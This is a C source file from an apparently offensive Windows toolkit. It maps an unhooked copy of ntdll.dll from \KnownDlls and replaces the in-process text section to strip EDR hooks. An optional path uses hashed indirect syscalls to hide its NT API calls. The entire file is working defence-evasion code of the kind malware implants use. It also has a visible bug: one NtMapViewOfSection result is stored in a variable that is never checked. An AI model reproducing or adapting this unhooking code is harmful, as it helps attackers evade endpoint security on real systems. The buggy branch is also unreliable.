#include "unhooking.h"

#define OBJ_CASE_INSENSITIVE                0x00000040L
#define NTDLL	L"\\KnownDlls\\ntdll.dll"



typedef NTSTATUS(NTAPI* fnNtOpenSection)(
    PHANDLE					SectionHandle,
    ACCESS_MASK				DesiredAccess,
    POBJECT_ATTRIBUTES		ObjectAttributes
    );



BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf) {

    PVOID pNtdllBuffer = NULL;
    HANDLE hSection = INVALID_HANDLE_VALUE;
    UNICODE_STRING UniStr;
    OBJECT_ATTRIBUTES ObjAtr;
    NTSTATUS STATUS;

    WCHAR FullName[MAX_PATH];
    WCHAR Buf[MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

    _strcpy(FullName, Buf);
    _strcat(FullName, L"Ntdll.dll");
    _RtlInitUnicodeString(&UniStr, FullName);

    InitializeObjectAttributes(
        &ObjAtr,
        &UniStr,
        0x40L,
        NULL,
        NULL
    );

    // getting NtOpenSection address
#ifdef HW_INDIRECT_SYSCALL
    NtOpenSection_t pNtOpenSection = (NtOpenSection_t)PrepareSyscallHash(NtOpenSection_JOAA);
#else
    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection");
#endif

    // getting the handle of ntdll.dll from KnownDlls
    STATUS = pNtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjAtr);
    if (STATUS != 0x00) {
        DebugPrint("[!] NtOpenSection Failed With Error : 0x%08X \n", (unsigned int)STATUS);
        goto _EndOfFunc;
    }

    // mapping the view of file of ntdll.dll
#ifdef HW_INDIRECT_SYSCALL
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)PrepareSyscallHash(NtMapViewOfSection_JOAA);
    if (pNtMapViewOfSection == NULL) {
        DebugPrint("[!] Failed to resolve NtMapViewOfSection via PrepareSyscallHash\n");
        goto _EndOfFunc;
    }

    PVOID BaseAddress = NULL; // Initialize to NULL to let the OS decide
    SIZE_T ViewSize = 0;      // Entire section
    LARGE_INTEGER SectionOffset = { 0 };

    NTSTATUS Status = pNtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &pNtdllBuffer,
        0,
        0,
        &SectionOffset,
        &ViewSize,
        ViewUnmap,
        0,
        PAGE_READONLY
    );
    if (STATUS != 0x00) {
        DebugPrint("[!] NtMapViewOfSection Failed With Error : 0x%08X \n", (unsigned int)STATUS);
        goto _EndOfFunc;
    }
#else
    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (pNtdllBuffer == NULL) {
        DebugPrint("[!] MapViewOfFile Failed With Error : %ld \n", GetLastError());
        goto _EndOfFunc;
    }
#endif

    * ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
    if (hSection)
        CloseHandle(hSection);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;
}

BOOL UnhookNtdllTextSectionViaKnownDlls() {

    PVOID pUnhookedNtdll = NULL;

    if (!MapNtdllFromKnownDlls(&pUnhookedNtdll)) {
        DebugPrint("[!] MapNtdllFromKnownDlls Failed \n");
        return FALSE;
    }
    DebugPrint("[i] Ntdll Mapped From KnownDlls \n");

    if (!ReplaceNtdllTxtSection(pUnhookedNtdll)) {
        DebugPrint("[!] ReplaceNtdllTxtSection Failed \n");
        return FALSE;
    }
    DebugPrint("[i] Ntdll Text Section Replaced \n");

#ifdef HW_INDIRECT_SYSCALL
    NtUnmapViewOfSection_t pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)PrepareSyscallHash(NtUnmapViewOfSection_JOAA);
    if (pNtUnmapViewOfSection == NULL) {
        DebugPrint("[!] Failed to resolve NtUnmapViewOfSection via PrepareSyscallHash\n");
        return FALSE;
    }

    NTSTATUS status = pNtUnmapViewOfSection(GetCurrentProcess(), pUnhookedNtdll);
    if (!NT_SUCCESS(status)) {
        DebugPrint("[!] NtUnmapViewOfSection Failed With Error: 0x%08X\n", status);
        return FALSE;
    }
#else
    UnmapViewOfFile(pUnhookedNtdll);
#endif
    DebugPrint("[i] Ntdll Unmapped \n");

    return TRUE;
}